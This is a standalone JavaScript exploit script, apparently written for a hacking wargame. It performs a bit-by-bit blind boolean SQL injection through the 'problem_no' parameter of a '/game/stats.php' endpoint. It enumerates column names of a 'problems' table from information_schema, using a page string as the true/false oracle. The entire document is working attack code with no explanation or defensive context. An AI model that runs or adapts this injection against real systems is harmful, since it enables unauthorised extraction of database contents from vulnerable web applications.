function pwn(params){
  var http = new XMLHttpRequest();
  var url = "/game/stats.php?action=psolve";
  http.open("POST", url, false);
  http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  http.send("action=showpsolve&problem_no="+params+"-- -");
  if(http.response.indexOf("you wanna be first") == -1){ return true; }
  else return false;
}

var tables = "";
var value = "";
var tmp = 0;
for(var k=0;k<10;k++){
  var value = "";
  for(var i=1;i<40;i++){
    var tmp = 0;
    for(var j=1;j<128;j*=2){
      if(pwn("1 and (select 1 union select 0 != (ascii(substr((select column_name from information_schema.columns where table_name=0x70726f626c656d73 limit "+k+",1),"+i+",1))%26"+j+"))")){
        tmp += j;
      }
    }
    value += String.fromCharCode(tmp);
    console.log(value);
    if(tmp == 0) break;
  }
  console.log("Table Name : "+value);
  if(value == "") break;
  tables += value;
  tables += ", ";
}
alert("Pwn End");
console.log("Table List : "+tables);
